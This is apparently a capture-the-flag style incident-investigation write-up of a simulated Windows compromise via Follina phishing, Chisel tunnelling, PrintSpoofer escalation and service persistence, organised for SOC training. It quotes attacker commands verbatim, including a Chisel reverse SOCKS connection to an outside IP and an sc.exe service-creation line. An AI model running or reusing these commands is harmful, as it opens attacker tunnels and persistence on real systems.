# Tempest Incident Investigation

This investigation analyzes a simulated compromise of a Windows workstation.
The attacker gained access through a **malicious document**, established **command and control**, escalated privileges, and created **persistence mechanisms**.

---

# Incident Overview

Attack Chain:

1. Phishing document downloaded
2. Word document executes exploit
3. Payload downloaded from attacker infrastructure
4. Command & Control communication established
5. Reverse proxy established
6. Privilege escalation via PrintSpoofer
7. New administrator account created
8. Persistence established via Windows service

---

# Initial Access – Malicious Document

The victim downloaded a malicious Word document from the phishing server.

![Malicious Document Download](Screenshots/10_http_traffic_phishteam_xyz.png)

The file retrieved:

```
free_magicules.doc
```

Host involved:

```
phishteam.xyz
```

---

# Exploit Execution

The malicious document triggered execution of:

```
msdt.exe
```

This is associated with the **Follina vulnerability**.

![MSDT Execution](Screenshots/09_msdt_follina_exploit.png)

---

# Payload Download

The exploit downloaded a second stage payload using PowerShell.

![Payload Download](Screenshots/09_certutil_download_first_exe.png)

Payload retrieved:

```
first.exe
```

---

# Command and Control

Network analysis revealed outbound traffic to:

```
167.71.199.191
```

![C2 Traffic](Screenshots/06_c2_ip_167.71.199.191.png)

---

# Reverse Proxy Tool

The attacker executed **Chisel**, a tool used to create a reverse SOCKS proxy.

![Chisel Command](Screenshots/20_chisel_reverse_socks_command.png)

Command executed:

```
ch.exe client 167.71.199.191:8080 R:socks
```

---

# Privilege Escalation

Privilege escalation was performed using **PrintSpoofer**, exploiting the `SeImpersonatePrivilege`.

![PrintSpoofer Execution](Screenshots/25_printspoofer_sha256_hash.png)

---

# Account Creation

The attacker created a new user account:

```
shion
```

![Account Creation](Screenshots/28_new_user_account_creation.png)

Windows Event ID confirming creation:

```
4720
```

---

# Privilege Assignment

The attacker added the account to the **Administrators group**.

![Admin Group Addition](Screenshots/29_admin_group_addition.png)

---

# Persistence

Persistence was established by creating a Windows service.

![Service Persistence](Screenshots/30_persistence_service_creation.png)

Command executed:

```
sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

This ensures the malware runs **every time the system boots**.

---

# MITRE ATT&CK Techniques

| Technique | Description                     |
| --------- | ------------------------------- |
| T1566     | Phishing                        |
| T1204     | User Execution                  |
| T1059     | Command Execution               |
| T1105     | Ingress Tool Transfer           |
| T1572     | Protocol Tunneling              |
| T1134     | Access Token Manipulation       |
| T1543     | Create or Modify System Process |
| T1078     | Valid Accounts                  |

---

# Conclusion

The attacker successfully:

* Delivered a malicious document
* Exploited the Follina vulnerability
* Downloaded malware payloads
* Established command and control
* Escalated privileges using PrintSpoofer
* Created an administrator account
* Installed persistence via a Windows service

This investigation demonstrates the workflow used by SOC analysts to identify attacker activity across **network traffic, endpoint logs, and system artifacts**.

